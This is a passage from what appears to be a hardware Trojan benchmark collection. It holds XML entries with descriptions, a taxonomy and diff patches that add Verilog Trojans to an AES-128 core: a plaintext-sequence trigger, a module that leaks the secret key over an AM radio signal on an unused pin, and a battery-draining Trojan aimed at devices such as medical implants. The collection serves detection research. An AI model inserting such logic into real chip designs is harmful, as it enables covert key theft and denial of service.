-        key   = 128&apos;h00010203_04050607_08090a0b_0c0d0e0f;
-        #10;
-        state = 128&apos;h0;
-        key   = 128&apos;h0;
-        #10;
-        state = 128&apos;h0;
-        key   = 128&apos;h1;
-        #10;
-        state = 128&apos;h1;
-        key   = 128&apos;h0;
-        #170;
-        if (out !== 128&apos;h3925841d02dc09fbdc118597196a0b32)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h69_c4_e0_d8_6a_7b_04_30_d8_cd_b7_80_70_b4_c5_5a)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h66_e9_4b_d4_ef_8a_2c_3b_88_4c_fa_59_ca_34_2b_2e)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h05_45_aa_d5_6d_a2_a9_7c_36_63_d1_43_2a_3d_1c_84)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h58_e2_fc_ce_fa_7e_30_61_36_7f_1d_57_a4_e7_45_5a)
-          begin $display(&quot;E&quot;); $finish; end
-        $display(&quot;Good.&quot;);
-        $finish;
-	end
-      
-    always #5 clk = ~clk;
-endmodule
-
diff -rupN aes/src/tjfree/top.v aes/src/tjin-t1600/top.v
--- aes/src/tjfree/top.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1600/top.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,33 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    12:55:51 03/08/2013 
+// Design Name: 
+// Module Name:    top 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module top(clk, rst, state, key, out, Antena);
+    input          clk, rst;
+    input  [127:0] state, key;
+    output [127:0] out;
+    output Antena;
+	 
+	 wire Tj_Trig;
+
+	aes_128 AES (clk, state, key, out);
+	Trojan_Trigger Tj_Trigger (rst, clk, state, Tj_Trig);
+	AM_Transmission TSC (key, clk, rst, Tj_Trig, Antena);
+
+endmodule
diff -rupN aes/src/tjfree/Trojan_Trigger.v aes/src/tjin-t1600/Trojan_Trigger.v
--- aes/src/tjfree/Trojan_Trigger.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1600/Trojan_Trigger.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,71 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    13:40:39 03/08/2013 
+// Design Name: 
+// Module Name:    Trojan_Trigger 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module Trojan_Trigger(
+    input rst,
+    input clk,
+    input [127:0] state,
+    output Tj_Trig
+    );
+
+	reg Tj_Trig;
+	reg tempClk1, tempClk2;
+	reg Detected;
+	
+	always @(tempClk1, tempClk2)
+	begin
+		Tj_Trig &lt;= tempClk1 | tempClk2;
+	end
+	
+	// Tj_Trig is high for two clock cycles
+	always @(posedge clk)
+	begin
+		if (rst == 1)	begin tempClk1 &lt;= 1; tempClk2 &lt;= 0; end
+		else if ((tempClk1 == 1) &amp;&amp; (Detected == 1))	begin tempClk1 &lt;= 0; tempClk2 &lt;= 1;	end
+		else if ((tempClk1 == 0) &amp;&amp; (tempClk2 == 1))	begin tempClk2 &lt;= 0;	end		
+		//else begin tempClk1 &lt;= 0; tempClk2 &lt;= 0; end
+	end
+
+	reg State0, State1, State2, State3;
+	
+	always @(rst, state)
+	begin
+		if (rst == 1) begin
+			State0 &lt;= 0;
+			State1 &lt;= 0;
+			State2 &lt;= 0;
+			State3 &lt;= 0; 
+		end else if (state == 128&apos;h3243f6a8_885a308d_313198a2_e0370734) begin
+			State0 &lt;= 1;
+		end else if ((state == 128&apos;h00112233_44556677_8899aabb_ccddeeff) &amp;&amp; (State0 == 1)) begin
+			State1 &lt;= 1;
+		end else if ((state == 128&apos;h0) &amp;&amp; (State1 == 1)) begin
+			State2 &lt;= 1;
+		end else if ((state == 128&apos;h1) &amp;&amp; (State2 == 1)) begin
+			State3 &lt;= 1;
+		end
+	end
+
+	always @(State0, State1, State2, State3)
+	begin
+		Detected &lt;= State0 &amp; State1 &amp; State2 &amp; State3;
+	end
+
+endmodule
  </trojan_patch>    
  </trojan>
  <trojan uid="9e4783e1-7112-49bf-a26c-c9e60d32e83e" name="t1700" abstraction_level="rtl" technology="">
	<trojan_description>
1.Home directory includes:

1.1 src
	---Codes for the AES algorithm, the test bench, and the Trojan

2.Trojan
Trojan Description
	Modulating an (unused) pin on a chip generates an RF signal. This signal can be used to transmit the key bits. 
	This attack is performed at 1560 KHz and can be received with an ordinary AM radio. The data carried by 
	the AM signal needs to be easily interpreted by a human. A beep scheme is utilized where a single beep followed 
	by a pause represents a .0. and a double beep followed by a pause represents a .1.. A description on detail 
	implementation of AM transmission can be found at [1]. In this implementation, the Trojan gets activated 
	after each 128'hFFFF_FFFF_FFFF_FFFF_FFFF_FFFF_FFFF_FFFF encryptions.

Trojan Taxonomy
	Insertion phase: Design
	Abstraction level: Register Transfer level  
	Activation mechanism: Internally conditionally triggered
	Effects: Leak Information
 	Location: Processor
	Physical characteristics: Functional


[1] Alex Baumgarten, Michael Steffen, Matthew Clausman, Joseph Zambreno, 
"A case study in hardware Trojan design and implementation," 
International Journal of Information Security, Volume 10, Issue 1, pp 1-14, 2011

	</trojan_description>
  <trojan_patch>
diff -rupN aes/src/tjfree/aes_128.v aes/src/tjin-t1700/aes_128.v
--- aes/src/tjfree/aes_128.v	2015-09-09 16:38:27.821921496 +0200
+++ aes/src/tjin-t1700/aes_128.v	2015-08-21 12:09:52.000000000 +0200
@@ -14,7 +14,7 @@
  * limitations under the License.
  */
 
-module aes_128(clk, state, key, out);
+module aes_128(clk, state, key, out);
     input          clk;
     input  [127:0] state, key;
     output [127:0] out;
diff -rupN aes/src/tjfree/aes_tb.v aes/src/tjin-t1700/aes_tb.v
--- aes/src/tjfree/aes_tb.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1700/aes_tb.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,70 @@
+`timescale 1ns / 1ps
+
+////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer:
+//
+// Create Date:   16:20:11 03/08/2013
+// Design Name:   top
+// Module Name:   D:/TrustHUB/HardwareTrojan/AES/AES128/AES3/AM_Transmission/AES_tb.v
+// Project Name:  AM_Transmission
+// Target Device:  
+// Tool versions:  
+// Description: 
+//
+// Verilog Test Fixture created by ISE for module: top
+//
+// Dependencies:
+// 
+// Revision:
+// Revision 0.01 - File Created
+// Additional Comments:
+// 
+////////////////////////////////////////////////////////////////////////////////
+
+module AES_tb;
+
+	// Inputs
+	reg clk;
+	reg rst;
+	reg [127:0] state;
+	reg [127:0] key;
+
+	// Outputs
+	wire [127:0] out;
+	wire Antena;
+
+	// Instantiate the Unit Under Test (UUT)
+	top uut (
+		.clk(clk), 
+		.rst(rst), 
+		.state(state), 
+		.key(key), 
+		.out(out), 
+		.Antena(Antena)
+	);
+
+	initial begin
+		// Initialize Inputs
+		clk = 0;
+		rst = 0;
+		state = 0;
+		key = 0;
+
+		// Wait 100 ns for global reset to finish
+		#5;
+      rst = 1;     
+		state = 128&apos;hFFFFFFFF_FFFFFFFF_FFFFFFFF_FFFFFFFF;
+		//state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
+      key   = 128&apos;haaaaaaaa_aaaaaaaa_aaaaaaaa_aaaaaaaa;
+
+		#15
+		rst = 0;
+
+		#300 $finish;
+	end
+	
+   always #10.015 clk = ~clk;
+	
+endmodule
+
diff -rupN aes/src/tjfree/am_transmission.v aes/src/tjin-t1700/am_transmission.v
--- aes/src/tjfree/am_transmission.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1700/am_transmission.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,65 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    11:14:06 03/08/2013 
+// Design Name: 
+// Module Name:    AM_Transmission 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module AM_Transmission(
+    input [127:0] key,
+    input clk,
+    input rst,
+	 input Tj_Trig, 
+    output Antena
+    );
+
+	reg [25:0] Baud8GeneratorACC;
+	reg [127:0] SHIFTReg;
+	
+	always @(posedge clk)
+	begin
+		if ((rst == 1&apos;b1) || (Tj_Trig == 1&apos;b1)) begin
+			Baud8GeneratorACC &lt;= 0;
+		end else begin
+			Baud8GeneratorACC &lt;= Baud8GeneratorACC + 1;
+		end
+	end
+	
+	always @(posedge Tj_Trig, posedge Baud8GeneratorACC[25])
+	begin
+		if (Tj_Trig == 1&apos;b1) begin
+			SHIFTReg &lt;= key;
+		end else begin	
+			SHIFTReg &lt;= SHIFTReg &gt;&gt; 1; 
+		end	
+	end
+
+//	always @(posedge rst, posedge Tj_Trig, posedge Baud8GeneratorACC[25])
+//	begin
+//		if ( (rst == 1&apos;b1) || (Tj_Trig == 1&apos;b1) ) begin
+//			SHIFTReg &lt;= key;
+//		end else begin	
+//			SHIFTReg &lt;= SHIFTReg &gt;&gt; 1; 
+//		end	
+//	end
+
+	assign beep1 = !(Baud8GeneratorACC[25] | Baud8GeneratorACC[24] | Baud8GeneratorACC[23]);
+	assign beep2 = !(Baud8GeneratorACC[25] | !(Baud8GeneratorACC[24]) | Baud8GeneratorACC[23]) &amp; SHIFTReg[0];
+	assign beeps = beep1 | beep2;
+	assign MUX_Sel = beeps &amp; Baud8GeneratorACC[15] &amp; Baud8GeneratorACC[4];
+	assign Antena = (MUX_Sel) ? !(rst): 1&apos;b0; 
+
+endmodule
diff -rupN aes/src/tjfree/read_me.txt aes/src/tjin-t1700/read_me.txt
--- aes/src/tjfree/read_me.txt	2015-09-09 16:38:27.817921496 +0200
+++ aes/src/tjin-t1700/read_me.txt	1970-01-01 01:00:00.000000000 +0100
@@ -1,12 +0,0 @@
-How to start the simulation
-
-1. simulation.do
-----------------
-This file is a batch file for Modelsim to compile the HDL files, setup the wave file, and begin function simulation. 
-The working directory of Modelsim must be the same directory of the batch file.
-
-2. test_aes_128.v
-----------------------
-This file is the main test bench. 
-It is self-checked. It feeds input data to the core and compare the correct result with the output of the core. 
-If the output is wrong, the test bench will display an error message.
diff -rupN aes/src/tjfree/simulation.do aes/src/tjin-t1700/simulation.do
--- aes/src/tjfree/simulation.do	2015-09-09 16:38:27.817921496 +0200
+++ aes/src/tjin-t1700/simulation.do	1970-01-01 01:00:00.000000000 +0100
@@ -1,11 +0,0 @@
-vlib work
-vlog ../rtl/*.v
-vlog *.v
-vsim -novopt test_aes_128
-add wave -noupdate -format Logic -radix unsigned /test_aes_128/clk
-add wave -noupdate -divider input
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/state
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/key
-add wave -noupdate -divider output
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/out
-run -all
diff -rupN aes/src/tjfree/tb_am.v aes/src/tjin-t1700/tb_am.v
--- aes/src/tjfree/tb_am.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1700/tb_am.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,66 @@
+`timescale 1ns / 1ps
+
+////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer:
+//
+// Create Date:   11:50:53 03/08/2013
+// Design Name:   AM_Transmission
+// Module Name:   D:/TrustHUB/HardwareTrojan/AES/AES128/AES3/AM_Transmission/tb_AM.v
+// Project Name:  AM_Transmission
+// Target Device:  
+// Tool versions:  
+// Description: 
+//
+// Verilog Test Fixture created by ISE for module: AM_Transmission
+//
+// Dependencies:
+// 
+// Revision:
+// Revision 0.01 - File Created
+// Additional Comments:
+// 
+////////////////////////////////////////////////////////////////////////////////
+
+module tb_AM;
+
+	// Inputs
+	reg [127:0] key;
+	reg clk;
+	reg rst;
+	reg Tj_Trig;
+	
+	// Outputs
+	wire Antena;
+
+	// Instantiate the Unit Under Test (UUT)
+	AM_Transmission uut (
+		.key(key), 
+		.clk(clk), 
+		.rst(rst), 
+		.Tj_Trig(Tj_Trig),
+		.Antena(Antena)
+	);
+
+	initial begin
+		// Initialize Inputs
+		key = 0;
+		clk = 0;
+		rst = 0;
+		Tj_Trig = 0;
+
+		// Wait 100 ns for global reset to finish
+		#5;
+      rst = 1;
+		Tj_Trig = 1;
+		key = 128&apos;hAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA;
+		// Add stimulus here
+		#25
+		Tj_Trig = 0;
+		rst = 0;
+		#300 $finish;
+	end
+	
+   always #10.015 clk = ~clk;
+endmodule
+
diff -rupN aes/src/tjfree/tbtop.v aes/src/tjin-t1700/tbtop.v
--- aes/src/tjfree/tbtop.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1700/tbtop.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,102 @@
+`timescale 1ns / 1ps
+
+////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer:
+//
+// Create Date:   10:26:15 03/19/2013
+// Design Name:   top
+// Module Name:   D:/TrustHUB/HardwareTrojan/AES/AES128/AES-T1001/AES/tbTOP.v
+// Project Name:  AES
+// Target Device:  
+// Tool versions:  
+// Description: 
+//
+// Verilog Test Fixture created by ISE for module: top
+//
+// Dependencies:
+// 
+// Revision:
+// Revision 0.01 - File Created
+// Additional Comments:
+// 
+////////////////////////////////////////////////////////////////////////////////
+
+module tbTOP;
+
+	// Inputs
+	reg clk;
+	reg rst;
+	reg [127:0] state;
+	reg [127:0] key;
+
+	// Outputs
+	wire [127:0] out;
+	wire Antena;
+	
+	// Instantiate the Unit Under Test (UUT)
+	top uut (
+		.clk(clk), 
+		.rst(rst), 
+		.state(state), 
+		.key(key), 
+		.out(out),
+		.Antena(Antena)
+	);
+
+	initial begin		clk = 0;
+		state = 0;
+		key = 0;
+		rst = 0;
+		
+		#20;
+		rst = 1;
+
+		#20;
+		rst = 0;
+		
+		#60;
+        /*
+         * TIMEGRP &quot;key&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;state&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;out&quot; OFFSET = OUT 2.2 ns BEFORE &quot;clk&quot; HIGH;
+         */
+        @ (negedge clk);
+        # 2;
+        state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
+        key   = 128&apos;h2b7e1516_28aed2a6_abf71588_09cf4f3c;
+        #10;
+        state = 128&apos;h00112233_44556677_8899aabb_ccddeeff;
+        key   = 128&apos;h00010203_04050607_08090a0b_0c0d0e0f;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h0;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h1;
+        #10;
+        state = 128&apos;h1;
+        key   = 128&apos;h0;
+        #170;
+        if (out !== 128&apos;h3925841d02dc09fbdc118597196a0b32)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h69_c4_e0_d8_6a_7b_04_30_d8_cd_b7_80_70_b4_c5_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h66_e9_4b_d4_ef_8a_2c_3b_88_4c_fa_59_ca_34_2b_2e)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h05_45_aa_d5_6d_a2_a9_7c_36_63_d1_43_2a_3d_1c_84)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h58_e2_fc_ce_fa_7e_30_61_36_7f_1d_57_a4_e7_45_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        $display(&quot;Good.&quot;);
+        $finish;
+	end
+      
+    always #5 clk = ~clk;
+      
+endmodule
+
diff -rupN aes/src/tjfree/test_aes_128.v aes/src/tjin-t1700/test_aes_128.v
--- aes/src/tjfree/test_aes_128.v	2015-09-09 16:38:27.817921496 +0200
+++ aes/src/tjin-t1700/test_aes_128.v	1970-01-01 01:00:00.000000000 +0100
@@ -1,85 +0,0 @@
-/*
- * Copyright 2012, Homer Hsing &lt;homer.hsing@gmail.com&gt;
- *
- * Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);
- * you may not use this file except in compliance with the License.
- * You may obtain a copy of the License at
- *
- * http://www.apache.org/licenses/LICENSE-2.0
- *
- * Unless required by applicable law or agreed to in writing, software
- * distributed under the License is distributed on an &quot;AS IS&quot; BASIS,
- * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
- * See the License for the specific language governing permissions and
- * limitations under the License.
- */
-
-`timescale 1ns / 1ps
-
-module test_aes_128;
-
-	// Inputs
-	reg clk;
-	reg [127:0] state;
-	reg [127:0] key;
-
-	// Outputs
-	wire [127:0] out;
-
-	// Instantiate the Unit Under Test (UUT)
-	aes_128 uut (
-		.clk(clk), 
-		.state(state), 
-		.key(key), 
-		.out(out)
-	);
-
-	initial begin
-		clk = 0;
-		state = 0;
-		key = 0;
-
-		#100;
-        /*
-         * TIMEGRP &quot;key&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
-         * TIMEGRP &quot;state&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
-         * TIMEGRP &quot;out&quot; OFFSET = OUT 2.2 ns BEFORE &quot;clk&quot; HIGH;
-         */
-        @ (negedge clk);
-        # 2;
-        state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
-        key   = 128&apos;h2b7e1516_28aed2a6_abf71588_09cf4f3c;
-        #10;
-        state = 128&apos;h00112233_44556677_8899aabb_ccddeeff;
-        key   = 128&apos;h00010203_04050607_08090a0b_0c0d0e0f;
-        #10;
-        state = 128&apos;h0;
-        key   = 128&apos;h0;
-        #10;
-        state = 128&apos;h0;
-        key   = 128&apos;h1;
-        #10;
-        state = 128&apos;h1;
-        key   = 128&apos;h0;
-        #170;
-        if (out !== 128&apos;h3925841d02dc09fbdc118597196a0b32)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h69_c4_e0_d8_6a_7b_04_30_d8_cd_b7_80_70_b4_c5_5a)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h66_e9_4b_d4_ef_8a_2c_3b_88_4c_fa_59_ca_34_2b_2e)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h05_45_aa_d5_6d_a2_a9_7c_36_63_d1_43_2a_3d_1c_84)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h58_e2_fc_ce_fa_7e_30_61_36_7f_1d_57_a4_e7_45_5a)
-          begin $display(&quot;E&quot;); $finish; end
-        $display(&quot;Good.&quot;);
-        $finish;
-	end
-      
-    always #5 clk = ~clk;
-endmodule
-
diff -rupN aes/src/tjfree/top.v aes/src/tjin-t1700/top.v
--- aes/src/tjfree/top.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1700/top.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,33 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    12:55:51 03/08/2013 
+// Design Name: 
+// Module Name:    top 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module top(clk, rst, state, key, out, Antena);
+    input          clk, rst;
+    input  [127:0] state, key;
+    output [127:0] out;
+    output Antena;
+	 
+	 wire Tj_Trig;
+
+	aes_128 AES (clk, state, key, out);
+	Trojan_Trigger Tj_Trigger (rst, out, Tj_Trig);
+	AM_Transmission TSC (key, clk, rst, Tj_Trig, Antena);
+
+endmodule
diff -rupN aes/src/tjfree/trojan_trigger.v aes/src/tjin-t1700/trojan_trigger.v
--- aes/src/tjfree/trojan_trigger.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1700/trojan_trigger.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,50 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    13:40:39 03/08/2013 
+// Design Name: 
+// Module Name:    Trojan_Trigger 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module Trojan_Trigger(
+    input rst,
+    input [127:0] out,
+    output Tj_Trig
+    );
+
+	reg Tj_Trig;
+	reg [127:0] Counter;
+	
+	always @(rst, out)
+	begin
+		if (rst == 1) begin
+			Counter &lt;= 0;
+		end else begin
+			Counter &lt;= Counter + 1;
+		end
+	end
+
+	always @(rst, Counter)
+	begin
+		if (rst == 1) begin
+			Tj_Trig &lt;= 0;
+		end else if (Counter == 128&apos;hffff_ffff_ffff_ffff_ffff_ffff_ffff_ffff) begin
+			Tj_Trig &lt;= 1;
+		end else begin
+			Tj_Trig &lt;= 0;		
+		end
+	end
+
+endmodule
  </trojan_patch>    
  </trojan>
  <trojan uid="66a2f44b-0fe2-4780-acfa-ec8f2f5323e5" name="t1800" abstraction_level="rtl" technology="">
	<trojan_description>
1.Home directory includes:

1.1 src
	---Codes for the AES algorithm, the test bench, and the Trojan

2.Trojan
Trojan Description
	At the core of lightweight applications, such as medical implant devices,are the batteries that power them and 
	the success of the device restsheavily on them. This Trojan drains the battery once it is activated. The Trojan 
	gets activated after observing a predefined input plaintext. The Trojan payload is a shift register which continuously 
	rotates after Trojan activation. The Trojan increases the power consumption and hence decreases the expected 
	lifetime of the battery.



Trojan Taxonomy
	Insertion phase: Design
	Abstraction level: Register Transfer level  
	Activation mechanism: Internally conditionally triggered
	Effects: Denial of Service
 	Location: Processor
	Physical characteristics: Functional
	</trojan_description>
  <trojan_patch>
diff -rupN aes/src/tjfree/aes_128.v aes/src/tjin-t1800/aes_128.v
--- aes/src/tjfree/aes_128.v	2015-09-09 16:38:27.821921496 +0200
+++ aes/src/tjin-t1800/aes_128.v	2015-08-21 12:09:52.000000000 +0200
@@ -14,7 +14,7 @@
  * limitations under the License.
  */
 
-module aes_128(clk, state, key, out);
+module aes_128(clk, state, key, out);
     input          clk;
     input  [127:0] state, key;
     output [127:0] out;
@@ -22,7 +22,7 @@ module aes_128(clk, state, key, out);
     wire   [127:0] s1, s2, s3, s4, s5, s6, s7, s8, s9,
                    k1, k2, k3, k4, k5, k6, k7, k8, k9,
                    k0b, k1b, k2b, k3b, k4b, k5b, k6b, k7b, k8b, k9b;
-
+
     always @ (posedge clk)
       begin
         s0 &lt;= state ^ key;
diff -rupN aes/src/tjfree/battery_tb.v aes/src/tjin-t1800/battery_tb.v
--- aes/src/tjfree/battery_tb.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1800/battery_tb.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,101 @@
+`timescale 1ns / 1ps
+
+////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer:
+//
+// Create Date:   18:44:19 03/08/2013
+// Design Name:   top
+// Module Name:   D:/TrustHUB/HardwareTrojan/AES/AES128/AES4/AES_BatteryDepletion/battery_tb.v
+// Project Name:  AES_BatteryDepletion
+// Target Device:  
+// Tool versions:  
+// Description: 
+//
+// Verilog Test Fixture created by ISE for module: top
+//
+// Dependencies:
+// 
+// Revision:
+// Revision 0.01 - File Created
+// Additional Comments:
+// 
+////////////////////////////////////////////////////////////////////////////////
+
+module battery_tb;
+
+	// Inputs
+	reg clk;
+	reg rst;
+	reg [127:0] state;
+	reg [127:0] key;
+
+	// Outputs
+	wire [127:0] out;
+
+	// Instantiate the Unit Under Test (UUT)
+	top uut (
+		.clk(clk), 
+		.rst(rst), 
+		.state(state), 
+		.key(key), 
+		.out(out)
+	);
+
+
+	initial begin
+		clk = 0;
+		state = 0;
+		key = 0;
+		rst = 0;
+
+		#50
+		rst = 1;
+		
+		#25
+		rst = 0;
+
+		#25
+        /*
+         * TIMEGRP &quot;key&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;state&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;out&quot; OFFSET = OUT 2.2 ns BEFORE &quot;clk&quot; HIGH;
+         */
+        @ (negedge clk);
+        # 2;
+        state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
+        key   = 128&apos;h2b7e1516_28aed2a6_abf71588_09cf4f3c;
+        #10;
+        state = 128&apos;h00112233_44556677_8899aabb_ccddeeff;
+        key   = 128&apos;h00010203_04050607_08090a0b_0c0d0e0f;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h0;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h1;
+        #10;
+        state = 128&apos;h1;
+        key   = 128&apos;h0;
+        #170;
+        if (out !== 128&apos;h3925841d02dc09fbdc118597196a0b32)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h69_c4_e0_d8_6a_7b_04_30_d8_cd_b7_80_70_b4_c5_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h66_e9_4b_d4_ef_8a_2c_3b_88_4c_fa_59_ca_34_2b_2e)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h05_45_aa_d5_6d_a2_a9_7c_36_63_d1_43_2a_3d_1c_84)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h58_e2_fc_ce_fa_7e_30_61_36_7f_1d_57_a4_e7_45_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        $display(&quot;Good.&quot;);
+        $finish;
+	end
+      
+    always #5 clk = ~clk;
+
+endmodule
diff -rupN aes/src/tjfree/read_me.txt aes/src/tjin-t1800/read_me.txt
--- aes/src/tjfree/read_me.txt	2015-09-09 16:38:27.817921496 +0200
+++ aes/src/tjin-t1800/read_me.txt	1970-01-01 01:00:00.000000000 +0100
@@ -1,12 +0,0 @@
-How to start the simulation
-
-1. simulation.do
-----------------
-This file is a batch file for Modelsim to compile the HDL files, setup the wave file, and begin function simulation. 
-The working directory of Modelsim must be the same directory of the batch file.
-
-2. test_aes_128.v
-----------------------
-This file is the main test bench. 
-It is self-checked. It feeds input data to the core and compare the correct result with the output of the core. 
-If the output is wrong, the test bench will display an error message.
diff -rupN aes/src/tjfree/simulation.do aes/src/tjin-t1800/simulation.do
--- aes/src/tjfree/simulation.do	2015-09-09 16:38:27.817921496 +0200
+++ aes/src/tjin-t1800/simulation.do	1970-01-01 01:00:00.000000000 +0100
@@ -1,11 +0,0 @@
-vlib work
-vlog ../rtl/*.v
-vlog *.v
-vsim -novopt test_aes_128
-add wave -noupdate -format Logic -radix unsigned /test_aes_128/clk
-add wave -noupdate -divider input
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/state
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/key
-add wave -noupdate -divider output
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/out
-run -all
diff -rupN aes/src/tjfree/tbtop.v aes/src/tjin-t1800/tbtop.v
--- aes/src/tjfree/tbtop.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1800/tbtop.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,101 @@
+`timescale 1ns / 1ps
+
+////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer:
+//
+// Create Date:   10:26:15 03/19/2013
+// Design Name:   top
+// Module Name:   D:/TrustHUB/HardwareTrojan/AES/AES128/AES-T1001/AES/tbTOP.v
+// Project Name:  AES
+// Target Device:  
+// Tool versions:  
+// Description: 
+//
+// Verilog Test Fixture created by ISE for module: top
+//
+// Dependencies:
+// 
+// Revision:
+// Revision 0.01 - File Created
+// Additional Comments:
+// 
+////////////////////////////////////////////////////////////////////////////////
+
+module tbTOP;
+
+	// Inputs
+	reg clk;
+	reg rst;
+	reg [127:0] state;
+	reg [127:0] key;
+
+	// Outputs
+	wire [127:0] out;
+	wire [63:0] Capacitance;
+
+	// Instantiate the Unit Under Test (UUT)
+	top uut (
+		.clk(clk), 
+		.rst(rst), 
+		.state(state), 
+		.key(key), 
+		.out(out)
+	);
+
+	initial begin		clk = 0;
+		state = 0;
+		key = 0;
+		rst = 0;
+		
+		#20;
+		rst = 1;
+
+		#20;
+		rst = 0;
+		
+		#60;
+        /*
+         * TIMEGRP &quot;key&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;state&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
